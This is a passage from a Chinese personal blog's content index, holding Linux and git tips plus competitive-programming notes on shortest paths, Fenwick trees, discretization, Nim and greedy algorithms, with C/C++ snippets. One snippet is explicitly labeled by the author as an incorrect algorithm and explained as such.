href=\"#cache的详细信息（包括相联度，电压等）\" class=\"headerlink\" title=\"cache的详细信息（包括相联度，电压等）\"></a>cache的详细信息（包括相联度，电压等）</h3><ul>\n<li><code>sudo dmidecode -t 7</code></li>\n<li><code>getconf -a | grep CACHE</code></li>\n</ul>\n<h3 id=\"设置默认浏览器\"><a href=\"#设置默认浏览器\" class=\"headerlink\" title=\"设置默认浏览器\"></a>设置默认浏览器</h3><ul>\n<li><code>xdg-settings set default-web-browser chrome.desktop</code></li>\n<li><code>xdg-settings get default-web-browser</code>获取值</li>\n<li>关于desktop文件的<code>Exec</code>段中的后缀，<a href=\"https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html\" target=\"_blank\" rel=\"noopener\">doc</a><blockquote>\n<p>%i    The Icon key of the desktop entry expanded as two arguments, first –icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.<br>%c    The translated name of the application as listed in the appropriate Name key in the desktop entry.<br>%k    The location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.<br>%f    A single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.<br>%F    A list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.<br>%u    A single URL. Local files may either be passed as file: URLs or as file path.<br>%U    A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"github账户有设置ssh但是仓库push还是要用户密码的解决方法\"><a href=\"#github账户有设置ssh但是仓库push还是要用户密码的解决方法\" class=\"headerlink\" title=\"github账户有设置ssh但是仓库push还是要用户密码的解决方法\"></a>github账户有设置ssh但是仓库push还是要用户密码的解决方法</h3><ul>\n<li>这是因为remote add时使用的是https，而不是ssh</li>\n<li><code>git remote -v</code>可以看到是https链接</li>\n<li><code>git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>改为ssh</li>\n<li><a href=\"https://help.github.com/articles/changing-a-remote-s-url/\" target=\"_blank\" rel=\"noopener\">参考</a></li>\n</ul>\n","slug":"My-ITOPS-Note","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"ITOps","slug":"ITOps","permalink":"https://h-zex.github.io/tags/ITOps/"}]},{"title":"My ACM Note","date":"2019-02-02T05:31:40.000Z","path":"2019/02/02/My-ACM-Note/","text":"全源最短路径的一种错误解法 错误代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int main() &#123; while (~scanf(\"%d\", &amp;N)) &#123; // assume that if no edge i-&gt;j, then input w[i][j] will be INF // and assume that w[i][i] == 0 FWD(i, 0, N) &#123; FWD(j, 0, N) &#123; scanf(\"%d\", &amp;w[i][j]); &#125; &#125; memset(dp, 0xff, sizeof(dp)); FWD(i, 0, N) &#123; FWD(j, 0, N) &#123; // if i == j, dfs can still return true answer dfs(i, j); &#125; &#125; FWD(i, 0, N) &#123; FWD(j, 0, N) &#123; printf(\"%15d\", dp[i][j]); &#125; printf(\"\\n\"); &#125; &#125;&#125;bool visit[MAXV];int __dfs(int now, int target);int dfs(int from, int target) &#123; memset(visit, 0, sizeof(visit)); visit[from] = true; return __dfs(from, target);&#125;int __dfs(int now, int target) &#123; if (dp[now][target] &gt; -1) &#123; return dp[now][target]; &#125; if (now == target) &#123; dp[now][target] = 0; return 0; // visit[now] will never be true; &#125; int ans = INF; FWD(i, 0, N) &#123; if (visit[i] || w[now][i] == INF || i==now) &#123; // avoid rings and not edge continue; &#125; visit[i] = true; int p = __dfs(i, target) + w[now][i]; visit[i] = false; if (p &lt; ans) &#123; NEXT[now][target] = i; // record the NEXT vertex of i in the shortest path now-&gt;target ans = p; &#125; &#125; dp[now][target] = ans; return ans;&#125; 不可以使用这种dp 对于每对点执行dfs，然后执行过程中，记忆化搜索。当然，为了避免执行过程出现不断的走环路的情况，需要使用visit，避免dfs过程中走环路。 虽然复杂度是$O(V^3)$ ，但是算法是错的 记忆化搜索计算$(begin,target)$ 时，假设dfs过程中经过了点i ，为了避免环，i不可以经过begin，但是，可能$(i,target)$ 的最优路径就是i经过点begin 到达的。 但是，记忆化过程中，却把在dfs$(begin,target)$过程中 计算出来的$(i,target)$ 作为i 到target 的结果。 NYOJ7 题目描述:一个街区有很多住户，街区的街道只能为东西、南北两种方向。住户只可以沿着街道行走。各个街道之间的间隔相等。用(x,y)来表示住户坐在的街区。例如（4,20），表示用户在东西方向第4个街道，南北方向第20个街道。现在要建一个邮局，使得各个住户到邮局的距离之和最少。求现在这个邮局应该建在那个地方使得所有住户距离之和最小； 输入描述:1234&gt; 第一行一个整数n&lt;20，表示有n组测试数据，下面是n组数据;&gt; 每组第一行一个整数m&lt;20,表示本组有m个住户，下面的m行每行有两个整数0&lt;x,y&lt;100，表示某个用户所在街区的坐标。&gt; m行后是新一组的数据；&gt; 输出描述:12&gt; 每组数据输出到邮局最小的距离和，回车结束；&gt; 样例输入:123456789101112&gt; 2&gt; 3&gt; 1 1&gt; 2 1&gt; 1 2&gt; 5&gt; 2 9 &gt; 5 20&gt; 11 9&gt; 1 1&gt; 1 20&gt; 样例输出:123&gt; 2&gt; 44&gt; 考虑横坐标的情况，取那个横坐标可以使得大家的在横坐标上需要走的距离最短？显然是中位数——反证法，加入有N个点，如果N是奇数，那么中位数就是d[N/2]，然后，尝试采用第N/2-1个点计算，显然，总量的变化是（设 t = d[N/2]-d[N/2-1] ），$+t(N/2+1)-tN/2$ ，也就是缩短的对于前N/2的用户来说，是缩短了，但是对于后面N/2+1个用户来说延长了 所以，无论y坐标取值多少，x坐标都要取中位数。同理，y也要取中位数 01背包 动态规划算法是伪多项式复杂度$O(NW)$，如果W很大，那么可能，直接枚举N元素的集合的所有子集会更快一些 找出一个序列中任意长度的逆序对 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n] 首先看看如何求二元逆序对 从左到右扫描序列，对于值位置为i的值x，flag[x]+=1 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i] 那么result的数组的和就是逆序对的数量 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n]; 同样扫描序列，对于位置为i的数x，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量 求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中 到最后，result_3就是结果 更多元组的也如此思路 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对 对于n元逆序对，同理，数组记录了当前已有的数x作为最后一个元素是x的n-1元逆序对的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与比他大的数代表的n-1元逆序对形成了更长的逆序对 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第i位的值是x） 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso） 关于使用优先队列的bfs 其实就是dijstra单源最短路径算法 关于O((V+E)lgV)：对每个点都需要从堆中pop出来（除了源点），对于每条边，都需要把该边对应的一个点压进堆里或者decrease key，consider that，如果一个点被pop出来，那么该点就在result set里，所以不会再被压到堆里。所以是O((V+E)lgV)，如果使用斐波那契堆，因为压到堆里以及decrease key的代价是O(1)，所以是O(VlgV+E) DP DP要找到什么因素影响了当前你要求的东西，有影响的我们就处理，没影响的我们不用管 浮点数输入 由于是二进制，所以有些十进制有限小数成了无限的，所以读取时会截断，所以要加上一个偏移量（比如读入到小数点后6位，可以加一个$2*10^{-7}$，这样，截断部分如果比较大，就可以反映出来，如果比较小，不会对产生进位，则没影响） 枚举所有素数 $O(N)$ 的做法 123456789101112const int CNT = (int)1e9+10;bool a[CNT];int main() &#123; a[0] = a[1] = true; FWD(i, 2, CNT) &#123; if (a[i]) &#123; continue; &#125; for (int j = 2 * i; j &lt; CNT; j += i) &#123; a[j] = true; &#125; &#125; 树状数组 注意，a[0]是没有放东西的，因为$i-lowbit(i)+1 &gt; 0$ 插线问点中，每一点 i 的值都是 sum(a[1] to a[i])。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//NYOJ 123int c[1000010],N;int lowbit(int x) //求最低位1的位置所表示的数&#123; return x&amp;(-x);&#125;void update(int p,int q)//常规数组中的a[p]更新，在树状数组中需要这样更新&#123; while(p&lt;=N) &#123; c[p]+=q; p+=lowbit(p); &#125;&#125;int S(int x) //S(i)表示的是的前i个数的和&#123; int sum=0; while(x&gt;0) &#123; sum+=c[x]; cout&lt;&lt;\"sum: \"&lt;&lt;sum&lt;&lt;\" \"; x-=lowbit(x); &#125; cout&lt;&lt;endl; return sum;&#125;int main()&#123; int T; char s[10]; scanf(\"%d%d\",&amp;T,&amp;N); while(T--)&#123; scanf(\"%s\",s); if(s[0]=='A')&#123; int l,r,num; scanf(\"%d%d%d\",&amp;l,&amp;r,&amp;num); update(l,num); update(r+1,-num); //每个士兵 i 的军功都是前 i 个元素的和，所以，[l, m]区间每个人加 num 的军功只需要给 //l 位置加上num，这样，[l, N]区间的每个人都加上了 num ，但是，我们只要[l, m]，所以要 //给 m+1 位置减去num, &#125; else &#123; int x; scanf(\"%d\",&amp;x); printf(\"%d\\n\",S(x)); for(int i=0;i&lt;=x;i++) &#123; cout&lt;&lt;c[i]&lt;&lt;\" \"; &#125; cout&lt;&lt;endl; for(int i=0;i&lt;=x;i++) &#123; cout&lt;&lt;S(i)&lt;&lt;\" \"; &#125; cout&lt;&lt;endl; &#125; &#125; return 0;&#125; 离散化 图形面积，解答 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include&lt;iostream&gt;#include &lt;algorithm&gt;#include&lt;string.h&gt;#include&lt;cstdio&gt;#include&lt;math.h&gt;using namespace std;double x[201],y[201],s[101][4];int xy[201][201];int n,cas=0;double sum;int main()&#123; int i,j,k; while(cin&gt;&gt;n) &#123; if(n==0) break; cas++; k=0; sum=0.0; memset(xy,0,sizeof(xy)); for(i=1;i&lt;=n;i++) &#123; cin&gt;&gt;s[i][0]&gt;&gt;s[i][1]&gt;&gt;s[i][2]&gt;&gt;s[i][3]; x[k]=s[i][0]; y[k]=s[i][1]; k++; x[k]=s[i][2]; y[k]=s[i][3]; k++; &#125; sort(x,x+2*n); sort(y,y+2*n); for (int i=1;i&lt;=n;i++) &#123; int i1=lower_bound(x,x+2*n,s[i][0])-x;//二分查找，跟普通的FOR语句一样 int j1=lower_bound(y,y+2*n,s[i][1])-y; int i2=lower_bound(x,x+2*n,s[i][2])-x; int j2=lower_bound(y,y+2*n,s[i][3])-y; for (int p1=i1;p1&lt;i2;p1++) //标记状态，记住我们是以一个方块的角标记状态所以p1&lt;i2，不是&lt;= for (int p=j1;p&lt;j2;p++) xy[p1][p]=1; &#125; for (int i=0;i&lt;2*n;i++)//统计 for (int j=0;j&lt;2*n;j++) if (xy[i][j]) &#123; sum+=(x[i+1]-x[i])*(y[j+1]-y[j]); &#125; printf(\"Test case #%d\\n\",cas); printf(\"Total explored area: %.2f\\n\",sum); printf(\"\\n\"); &#125; return 0;&#125; 其实就是，把坐标间的距离都忽略掉，把坐标的集中在一起，一个挨着一个，然后遍历整个标记区域，某个单元格有标记说明该位置两边都对应地存在两个坐标（原始数据中的），则只需要知道这两个原始数据中的坐标相差多远，就可以知道这个标记代表着多大的面积。 POJ3278 N是人的位置，K是牛的位置 一种lgN的做法 如果N的二进制大于等于K的二进制，则直接走x-1法 否则，想办法修改N的二进制使得其与K的二进制的最高几位重合，然后接下来的二进制就直接用x2和+1来实现（二进制位为0则x2，为1则+1） 假设K与N重合的二进制部分为W 如果W&lt;N，可以消减N使得N==W，也可以N乘以多次2然后减去一些1使得N与新的W相同（因为随着N×2，其与K重合的最高二进制位变多，所以说是新的W） 如果W&gt;N，可以先进行多次加一使得重合，或者是多次×2后多次-1使得重合 即使W小于N，也有可能先乘以几次2后在进行几次-1比较高效（因为可能后面很多个1，导致如果直接消减W） 总结起来就是，构造W与N相同的过程中，可以对N乘以一次2、两次2…P次2，对于每种乘2，减去或加上一些1使得重合，然后再计算在此基础上需要的时间 也就是不断试错的过程 子集和问题的动态规划解法 如果只是要求出是否有一个解法，或者是要求出有多少个解法，那么动态规划可行 子集和问题变形 问题：给定一个正整数M和另一个K，要求求出M切分成K份，每份都是正整数的解法有多少。同样可以动态规划 floyd求最小环 最小环的定义：在有向或是无向的简单图中在找到一条路径，其从点x到点x，总的权重最小。（不可以直接x到x，在无向图中也不可以利用x到y，y到x，因为如果可以这样，意味着多重边或是使用同一条边） 如果可以确定w[x][x] = INF，那么floyd然后找到最小的w[x][x]既可。 否则，不可以通过使得所有的w[x][x]变为INF来实现，因为floyd过程中，会使用到 查询第K大 如果是静态数组，多次查询，直接一个sort 如果是静态数组，一次查询，算导中那个快排变体，$O(N)$ 如果是动态数组，字典树——每个数以二进制表示，构造字典树，字典树的node需要维护当前node为root的子树的叶子数目，从而在任意一个非叶子节点，可以选择要走那条路下去——可以算出，二进制比x进制更快 Nim游戏（博弈论） 定义P-position和N-position，其中P代表Previous，N代表Next。直观的说，上一次move的人有必胜策略的局面是P-position，也就是“后手可保证必胜”或者“先手必败”，现在轮到move的人有必胜策略的局面是N-position，也就是“先手可保证必胜”。更严谨的定义是：1.无法进行任何移动的局面（也就是terminal position）是P-position；2.可以移动到P-position的局面是N-position；3.所有移动都导致N-position的局面是P-position。 P-position需要保证所有子格局都是N-position，N-position只要找到第一个子格局是P-position即可。 通过数学归纳法，两堆石子的情况下，两堆相等是P-position 如果局面不可能重现，或者说positions的集合可以进行拓扑排序，那么每个position或者是P-position或者是N-position，而且可以通过定义计算出来。 HDU3483[题意]输入n, x, m ，求$(1^x)(x^1)+(2^x)(x^2)+(3^x)(x^3)+…+(n^x)(x^n)$ [解题方法]设$f[n] = [x^n, n(x^n), (n^2)(x^n),…, (n^x)(x^n)]$，则$f[n][k] = (n^k)(x^n)$，问题转化为求：$(g[n] = f[1][x]+f[2][x]+…+f[n][x])$，设C(i,j)为组合数，即i种元素取j种的方法数，所以有：$$f[n+1][k] = ((n+1)^k)(x^(n+1)) \\text{（二次多项式展开）}\\ = x( C(k,0)(x^n)+C(k,1)n(x^n)+…+C(k,k)(n^k)(x^n))\\= x(C(k,0)f[n][0]+C(k,1)f[n][1]+…+C(k,k)*f[n][k])​$$所以得： 12345678|x*1 0................................0| |f[n][0]| |f[n+1][0]| |x*1 x*1 0............................0| |f[n][1]| |f[n+1][1]| |x*1 x*2 x*1 0........................0| * |f[n][2]| = |f[n+1][2]| |......................................| |.......| |.........| |x*1 x*C(k,1) x*C(k,2)...x*C(k,x) 0...0| |f[n][k]| |f[n+1][k]| |......................................| |.......| |.........| |x*1 x*C(x,1) x*C(x,2).......x*C(x,x) 0| |f[n][x]| |f[n+1][x]| |0................................0 1 1| |g[n-1] | | g[ n ] | KMP算法理解预处理算法 预处理出来的第 $i$ 位结果 $p[i]$ 是原字符串截止到第 $i$ 那个字符的最小周期，也就是只需要移动最少量的字符 $p[i]$ 既可以使得原先匹配部分再次匹配起来。 为什么偶数长度的回文数字串不是primer ref Because even length prime digit numbers are divisible by 11 therefore are not prime.It’s a trick that has to do powers of 10 and mod 11.Ex: 10 = 10^1 mod 11 = -1 mod 11​ $100 = 10^2 = 1 \\mod 11$​ $1000 = 10^3 = -1 \\mod 11$​ $10000 = 10^4 = 1 \\mod 11$See the pattern?Even exponent powers of 10 are 1 mod 11Odd exponent powers of 10 are -1 mod 11. We also know decimal numbers are just base 10 expansion of the digits. So $1225 = (10^3)1 + 2(10^2) + 2(10^1) + 5(10^0).$​ using modular arithmetic we can say, 1225 MOD 11 = (-1)*1 + 2*(1) + 2*(-1) + 5*(1) = -1 + 2 + 2 + 5 = 8. In other words, in MOD 11 we calculate what a decimal number is by just alternating the addition and subtraction across the digits. Another example. $1323412 \\mod 11 = 1 -3 +2 -3 +4 -1 +2\\mod 11 = 0.$ Then it becomes why it is quite obvious why the above logic works for even palindromes. Example: $321123 = -3 + 2 - 1 + 1 -2 + 3 = 0$. All the numbers cancel out with each other. 贪心算法总结 在每个贪心算法后面几乎总有一个DP解法 如何证明是否可以用贪心算法求解一个问题？并没有通用方法，但是贪心选择性质和最优子结构是两个关键要素 如果贪心选择时需要考虑众多选择，通常意味着可以改进贪心选择来获得更高效的解法 贪心选择性质 可以通过做出局部最优的选择来构造全局最优 证明方法：首先考察某个子问题的最优解，然后用贪心选择替换某个其他选择来修改此解，从而得到一个相似但是更小的子问题 一组有效的步骤 确定问题的最优子结构（如果一个问题的最优解包含其子问题的最优解，则称此问题具有最优子结构性质） 设计一个递归解法（该递归解法加上记忆就可以变成自顶向下的DP） 证明如果做出一个贪心选择，就只剩下一个子问题（或许可能是几个子问题？不过子问题的数量确实要比自顶向下的DP解法少） 证明贪心选择总是安全的 什么是安全的？ 做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的 做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构 设计一个递归算法实现贪心策略 把递归算法转为迭代算法 一组简化的步骤 将最优化问题转为这样的形式：做出一次选择后，只剩下一个子问题需要求解 证明做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的 证明做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构","raw":"---\ntitle: My ACM Note\ndate: 2019-02-02 13:31:40\ntags:\n- ACM\n- note\ncategories:\n- 算法\n---\n\n### 全源最短路径的一种错误解法\n\n- 错误代码\n\n  ```cpp\n  \n  int main() {\n      while (~scanf(\"%d\", &N)) {\n          // assume that if no edge i->j, then input w[i][j] will be INF\n          // and assume that w[i][i] == 0\n          FWD(i, 0, N) {\n              FWD(j, 0, N) {\n                  scanf(\"%d\", &w[i][j]);\n              }\n          }\n          memset(dp, 0xff, sizeof(dp));\n          FWD(i, 0, N) {\n              FWD(j, 0, N) {\n                  // if i == j, dfs can still return true answer\n                  dfs(i, j);\n              }\n          }\n          FWD(i, 0, N) {\n              FWD(j, 0, N) {\n                  printf(\"%15d\", dp[i][j]);\n              }\n              printf(\"\\n\");\n          }\n      }\n  }\n  \n  bool visit[MAXV];\n  int __dfs(int now, int target);\n  int dfs(int from, int target) {\n      memset(visit, 0, sizeof(visit));\n      visit[from] = true;\n      return __dfs(from, target);\n  }\n  \n  int __dfs(int now, int target) {\n      if (dp[now][target] > -1) {\n          return dp[now][target];\n      }\n      if (now == target) {\n          dp[now][target] = 0;\n          return 0; // visit[now] will never be true;\n      }\n      int ans = INF;\n      FWD(i, 0, N) {\n          if (visit[i] || w[now][i] == INF || i==now) { // avoid rings and not edge\n              continue;\n          }\n          visit[i] = true;\n          int p = __dfs(i, target) + w[now][i];\n          visit[i] = false;\n          if (p < ans) {\n              NEXT[now][target] = i; // record the NEXT vertex of i in the shortest path now->target\n              ans = p;\n          }\n      }\n      dp[now][target] = ans;\n      return ans;\n  }\n  ```\n\n- 不可以使用这种dp\n\n- 对于每对点执行dfs，然后执行过程中，记忆化搜索。当然，为了避免执行过程出现不断的走环路的情况，需要使用visit，避免dfs过程中走环路。\n\n- 虽然复杂度是$O(V^3)$ ，但是算法是错的\n\n- 记忆化搜索计算$(begin,target)$ 时，假设dfs过程中经过了点`i` ，为了避免环，`i`不可以经过`begin`，但是，可能$(i,target)$ 的最优路径就是`i`经过点`begin` 到达的。\n\n- 但是，记忆化过程中，却把在dfs$(begin,target)$过程中 计算出来的$(i,target)$ 作为`i` 到`target` 的结果。\n\n### NYOJ7\n\n> ##### 题目描述:\n>\n> 一个街区有很多住户，街区的街道只能为东西、南北两种方向。\n> 住户只可以沿着街道行走。\n> 各个街道之间的间隔相等。\n> 用(x,y)来表示住户坐在的街区。\n> 例如（4,20），表示用户在东西方向第4个街道，南北方向第20个街道。\n> 现在要建一个邮局，使得各个住户到邮局的距离之和最少。\n> 求现在这个邮局应该建在那个地方使得所有住户距离之和最小；\n>\n> ##### 输入描述:\n>\n> ```\n> 第一行一个整数n<20，表示有n组测试数据，下面是n组数据;\n> 每组第一行一个整数m<20,表示本组有m个住户，下面的m行每行有两个整数0<x,y<100，表示某个用户所在街区的坐标。\n> m行后是新一组的数据；\n> ```\n>\n> ##### 输出描述:\n>\n> ```\n> 每组数据输出到邮局最小的距离和，回车结束；\n> ```\n>\n> ##### 样例输入:\n>\n> ```\n> 2\n> 3\n> 1 1\n> 2 1\n> 1 2\n> 5\n> 2 9 \n> 5 20\n> 11 9\n> 1 1\n> 1 20\n> ```\n>\n> ##### 样例输出:\n>\n> ```\n> 2\n> 44\n> ```\n\n- 考虑横坐标的情况，取那个横坐标可以使得大家的在横坐标上需要走的距离最短？显然是中位数——反证法，加入有N个点，如果N是奇数，那么中位数就是d[N/2]，然后，尝试采用第N/2-1个点计算，显然，总量的变化是（设 t = d[N/2]-d[N/2-1] ），$+t*(N/2+1)-t*N/2$ ，也就是缩短的对于前N/2的用户来说，是缩短了，但是对于后面N/2+1个用户来说延长了\n- 所以，无论y坐标取值多少，x坐标都要取中位数。同理，y也要取中位数\n\n### 01背包\n\n- 动态规划算法是伪多项式复杂度$O(NW)$，如果W很大，那么可能，直接枚举N元素的集合的所有子集会更快一些\n\n### 找出一个序列中任意长度的逆序对\n\n- 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i>x_{i+1}>x_{i+2}>...$那么就是逆序对\n- 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量\n- 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]\n- 首先看看如何求二元逆序对\n   - 从左到右扫描序列，对于值位置为`i`的值`x`，flag[x]+=1\n   - 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]\n   - 那么result的数组的和就是逆序对的数量\n   - 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对\n- 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result\\_2数组)，此时设另外的两个数组int flag\\_3[MAX+1], int result_3[n];\n   - 同样扫描序列，对于位置为`i`的数`x`，取出result\\_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag\\_3[x]记录了截止目前，以x结尾的二元组逆序对的数量\n   - 求$\\sum_{j=x+1}^{MAX}flag\\_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中\n   - 到最后，result_3就是结果\n- 更多元组的也如此思路\n- 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对\n- 对于n元逆序对，同理，数组记录了当前已有的数`x`作为`最后一个元素是x的n-1元逆序对`的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与`比他大的数代表的n-1元逆序对`形成了更长的逆序对\n- 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第`i`位的值是`x`）\n\n> 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）\n\n### 关于使用优先队列的bfs\n\n- 其实就是dijstra单源最短路径算法\n- 关于O((V+E)lgV)：对每个点都需要从堆中pop出来（除了源点），对于每条边，都需要把该边对应的一个点压进堆里或者decrease key，consider that，如果一个点被pop出来，那么该点就在result set里，所以不会再被压到堆里。所以是O((V+E)lgV)，如果使用斐波那契堆，因为压到堆里以及decrease key的代价是O(1)，所以是O(VlgV+E)\n\n### DP\n\n- DP要找到什么因素影响了当前你要求的东西，有影响的我们就处理，没影响的我们不用管\n\n### 浮点数输入\n\n- 由于是二进制，所以有些十进制有限小数成了无限的，所以读取时会截断，所以要加上一个偏移量（比如读入到小数点后6位，可以加一个$2*10^{-7}$，这样，截断部分如果比较大，就可以反映出来，如果比较小，不会对产生进位，则没影响）\n\n### 枚举所有素数\n\n- $O(N)$ 的做法\n   ```cpp\n   const int CNT = (int)1e9+10;\n   bool a[CNT];\n   int main() {\n       a[0] = a[1] = true;\n       FWD(i, 2, CNT) {\n           if (a[i]) {\n               continue;\n           }\n           for (int j = 2 * i; j < CNT; j += i) {\n                a[j] = true;\n           }\n       }\n   ```\n\n### 树状数组\n\n-   注意，a[0]是没有放东西的，因为$i-lowbit(i)+1 > 0$\n\n-   插线问点中，每一点 i 的值都是 sum(a[1] to a[i])。\n\n    ```c\n    //NYOJ 123\n    int c[1000010],N;\n    int lowbit(int x) //求最低位1的位置所表示的数\n    {\n        return x&(-x);\n    }\n    void update(int p,int q)//常规数组中的a[p]更新，在树状数组中需要这样更新\n    {\n\n        while(p<=N)\n        {\n            c[p]+=q;\n            p+=lowbit(p);\n        }\n    }\n    int S(int x)  //S(i)表示的是的前i个数的和\n    {\n        int sum=0;\n        while(x>0)\n        {\n            sum+=c[x];\n            cout<<\"sum: \"<<sum<<\" \";\n            x-=lowbit(x);\n        }\n        cout<<endl;\n        return sum;\n    }\n    int main()\n    {\n        int T;\n        char s[10];\n        scanf(\"%d%d\",&T,&N);\n        while(T--){\n            scanf(\"%s\",s);\n            if(s[0]=='A'){\n                int l,r,num;\n                scanf(\"%d%d%d\",&l,&r,&num);\n                update(l,num);\n                update(r+1,-num);\n              //每个士兵 i 的军功都是前 i 个元素的和，所以，[l, m]区间每个人加 num 的军功只需要给\n              //l 位置加上num，这样，[l, N]区间的每个人都加上了 num ，但是，我们只要[l, m]，所以要\n              //给 m+1 位置减去num,\n            }\n            else {\n                int x;\n                scanf(\"%d\",&x);\n                printf(\"%d\\n\",S(x));\n                for(int i=0;i<=x;i++) {\n                    cout<<c[i]<<\" \";\n                }\n                cout<<endl;\n                for(int i=0;i<=x;i++) {\n                    cout<<S(i)<<\" \";\n                }\n                cout<<endl;\n            }\n        }\n        return 0;\n    }\n    ```\n\n### 离散化\n\n-   [图形面积](https://vijos.org/p/1056)，[解答](http://www.cnblogs.com/forgot93/archive/2014/07/02/3819956.html)\n\n    ```cpp\n    #include<iostream>\n    #include <algorithm>\n    #include<string.h>\n    #include<cstdio>\n    #include<math.h>\n    using namespace std;\n    double x[201],y[201],s[101][4];\n    int xy[201][201];\n    int n,cas=0;\n    double sum;\n    int main()\n    {\n        int i,j,k;\n        while(cin>>n)\n        {\n            if(n==0)   break;\n            cas++;\n            k=0;\n            sum=0.0;\n            memset(xy,0,sizeof(xy));\n\n            for(i=1;i<=n;i++)\n            {\n                cin>>s[i][0]>>s[i][1]>>s[i][2]>>s[i][3];\n                x[k]=s[i][0];\n                y[k]=s[i][1];\n                k++;\n                x[k]=s[i][2];\n                y[k]=s[i][3];\n                k++;\n            }\n            sort(x,x+2*n);\n            sort(y,y+2*n);\n\n            for (int i=1;i<=n;i++)\n            {\n             int  i1=lower_bound(x,x+2*n,s[i][0])-x;//二分查找，跟普通的FOR语句一样\n             int  j1=lower_bound(y,y+2*n,s[i][1])-y;\n             int  i2=lower_bound(x,x+2*n,s[i][2])-x;\n             int  j2=lower_bound(y,y+2*n,s[i][3])-y;\n             for (int p1=i1;p1<i2;p1++)\n               //标记状态，记住我们是以一个方块的角标记状态所以p1<i2，不是<=\n             for (int p=j1;p<j2;p++)\n             xy[p1][p]=1;\n            }\n            for (int i=0;i<2*n;i++)//统计\n                for (int j=0;j<2*n;j++)\n                if (xy[i][j]) {\n                sum+=(x[i+1]-x[i])*(y[j+1]-y[j]);\n            }\n             printf(\"Test case #%d\\n\",cas);\n             printf(\"Total explored area: %.2f\\n\",sum);\n             printf(\"\\n\");\n        }\n        return 0;\n    }\n    ```\n\n    其实就是，把坐标间的距离都忽略掉，把坐标的集中在一起，一个挨着一个，然后遍历整个标记区域，某个单元格有标记说明该位置两边都对应地存在两个坐标（原始数据中的），则只需要知道这两个原始数据中的坐标相差多远，就可以知道这个标记代表着多大的面积。\n\n### POJ3278\n\n-   N是人的位置，K是牛的位置\n-   一种lgN的做法\n    -   如果N的二进制大于等于K的二进制，则直接走x-1法\n    -   否则，想办法修改N的二进制使得其与K的二进制的最高几位重合，然后接下来的二进制就直接用x2和+1来实现（二进制位为0则x2，为1则+1）\n    -   假设K与N重合的二进制部分为W\n        -   